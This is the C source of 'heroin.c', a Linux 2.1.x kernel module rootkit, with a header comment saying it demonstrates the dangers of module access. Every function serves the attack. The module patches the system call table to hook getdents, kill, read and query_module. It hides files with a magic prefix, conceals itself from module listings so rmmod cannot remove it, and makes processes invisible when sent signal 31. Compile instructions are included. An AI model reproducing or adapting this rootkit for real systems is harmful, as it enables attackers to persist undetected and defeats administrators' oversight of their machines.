/*
 * heroin.c
 *
 * Runar Jensen <zarq@opaque.org>
 *
 * This Linux kernel module patches the getdents(), kill(), read()
 * and query_module() system calls to demonstrate the potential
 * dangers of the way modules have full access to the entire kernel.
 *
 * Once loaded, the module becomes invisible and can not be removed
 * with rmmod. Any files or directories starting with the string
 * defined by MAGIC_PREFIX appear to disappear, and sending a signal
 * 31 to any process as root effectively hides it and all its future
 * children.
 *
 * This code should compile cleanly and work with most (if not all)
 * recent 2.1.x kernels, and has been tested under 2.1.44 and 2.1.57.
 * It will not compile as is under 2.0.30, since 2.0.30 lacks the
 * query_module() function.
 *
 * Compile with:
 *   gcc -O2 -fomit-frame-pointer -DMODULE -D__KERNEL__ -c heroin.c
 */

#include <linux/fs.h>
#include <linux/module.h>
#include <linux/modversions.h>
#include <linux/malloc.h>
#include <linux/unistd.h>
#include <sys/syscall.h>

#include <linux/dirent.h>
#include <linux/proc_fs.h>
#include <stdlib.h>

#define MAGIC_PREFIX "heroin"

#define PF_INVISIBLE 0x10000000
#define SIGINVISI 31

int errno;

static inline _syscall3(int, getdents, uint, fd, struct dirent *, dirp, uint, count);
static inline _syscall2(int, kill, pid_t, pid, int, sig);
static inline _syscall3(ssize_t, read, int, fd, void *, buf, size_t, count);
static inline _syscall5(int, query_module, const char *, name, int, which, void *, buf, size_t, bufsize, size_t *, ret);

extern void *sys_call_table[];

int (*original_getdents)(unsigned int, struct dirent *, unsigned int);
int (*original_kill)(pid_t, int);
int (*original_read)(int, void *, size_t);
int (*original_query_module)(const char *, int, void *, size_t, size_t *);

int myatoi(char *str)
{
        int res = 0;
        int mul = 1;
        char *ptr;

        for(ptr = str + strlen(str) - 1; ptr >= str; ptr--) {
                if(*ptr < '0' || *ptr > '9')
                        return(-1);
                res += (*ptr - '0') * mul;
                mul *= 10;
        }
        return(res);
}

void mybcopy(char *src, char *dst, unsigned int num)
{
        while(num--)
                *(dst++) = *(src++);
}

int mystrcmp(char *str1, char *str2)
{
        while(*str1 && *str2)
                if(*(str1++) != *(str2++))
                        return(-1);
        return(0);
}

struct task_struct *find_task(pid_t pid)
{
        struct task_struct *task = current;

        do {
                if(task->pid == pid)
                        return(task);

                task = task->next_task;

        } while(task != current);

        return(NULL);
}

int is_invisible(pid_t pid)
{
        struct task_struct *task;

        if((task = find_task(pid)) == NULL)
                return(0);

        if(task->flags & PF_INVISIBLE)
                return(1);

        return(0);
}

int hacked_getdents(unsigned int fd, struct dirent *dirp, unsigned int count)
{
        int res;
        int proc = 0;
        struct inode *dinode;
        char *ptr = (char *)dirp;
        struct dirent *curr;
        struct dirent *prev = NULL;

        res = (*original_getdents)(fd, dirp, count);

        if(!res)
                return(res);

        if(res == -1)
                return(-errno);

#ifdef __LINUX_DCACHE_H
        dinode = current->files->fd[fd]->f_dentry->d_inode;
#else
        dinode = current->files->fd[fd]->f_inode;
#endif

        if(dinode->i_ino == PROC_ROOT_INO && !MAJOR(dinode->i_dev) && MINOR(dinode->i_dev) == 1)
                proc = 1;

        while(ptr < (char *)dirp + res) {
                curr = (struct dirent *)ptr;

                if((!proc && !mystrcmp(MAGIC_PREFIX, curr->d_name)) ||
                        (proc && is_invisible(myatoi(curr->d_name)))) {

                        if(curr == dirp) {
                                res -= curr->d_reclen;
                                mybcopy(ptr + curr->d_reclen, ptr, res);
                                continue;
                        }
                        else
                                prev->d_reclen += curr->d_reclen;
                }
                else
                        prev = curr;

                ptr += curr->d_reclen;
        }

        return(res);
}

int hacked_kill(pid_t pid, int sig)
{
        int res;
        struct task_struct *task = current;

        if(sig != SIGINVISI) {
                res = (*original_kill)(pid, sig);

                if(res == -1)
                        return(-errno);

                return(res);
        }

        if((task = find_task(pid)) == NULL)
                return(-ESRCH);

        if(current->uid && current->euid)
                return(-EPERM);

        task->flags |= PF_INVISIBLE;

        return(0);
}

int hacked_read(int fd, char *buf, size_t count)
{
        int res;
        char *ptr, *match;
        struct inode *dinode;

        res = (*original_read)(fd, buf, count);

        if(res == -1)
                return(-errno);

#ifdef __LINUX_DCACHE_H
        dinode = current->files->fd[fd]->f_dentry->d_inode;
#else
        dinode = current->files->fd[fd]->f_inode;
#endif

        if(dinode->i_ino != PROC_MODULES || MAJOR(dinode->i_dev) || MINOR(dinode->i_dev) != 1)
                return(res);

        ptr = buf;

        while(ptr < buf + res) {
                if(!mystrcmp(MAGIC_PREFIX, ptr)) {
                        match = ptr;
                        while(*ptr && *ptr != '\n')
                                ptr++;
                        ptr++;
                        mybcopy(ptr, match, (buf + res) - ptr);
                        res = res - (ptr - match);
                        return(res);
                }
                while(*ptr && *ptr != '\n')
                        ptr++;
                ptr++;
        }

        return(res);
}

int hacked_query_module(const char *name, int which, void *buf, size_t bufsize, size_t *ret)
{
        int res;
        int cnt;
        char *ptr, *match;

        res = (*original_query_module)(name, which, buf, bufsize, ret);

        if(res == -1)
                return(-errno);

        if(which != QM_MODULES)
                return(res);

        ptr = buf;

        for(cnt = 0; cnt < *ret; cnt++) {
                if(!mystrcmp(MAGIC_PREFIX, ptr)) {
                        match = ptr;
                        while(*ptr)
                                ptr++;
                        ptr++;
                        mybcopy(ptr, match, bufsize - (ptr - (char *)buf));
                        (*ret)--;
                        return(res);
                }
                while(*ptr)
                        ptr++;
                ptr++;
        }

        return(res);
}

int init_module(void)
{
        original_getdents = sys_call_table[SYS_getdents];
        sys_call_table[SYS_getdents] = hacked_getdents;

        original_kill = sys_call_table[SYS_kill];
        sys_call_table[SYS_kill] = hacked_kill;

        original_read = sys_call_table[SYS_read];
        sys_call_table[SYS_read] = hacked_read;

        original_query_module = sys_call_table[SYS_query_module];
        sys_call_table[SYS_query_module] = hacked_query_module;

        return(0);
}

void cleanup_module(void)
{
        sys_call_table[SYS_getdents] = original_getdents;
        sys_call_table[SYS_kill] = original_kill;
        sys_call_table[SYS_read] = original_read;
        sys_call_table[SYS_query_module] = original_query_module;
}
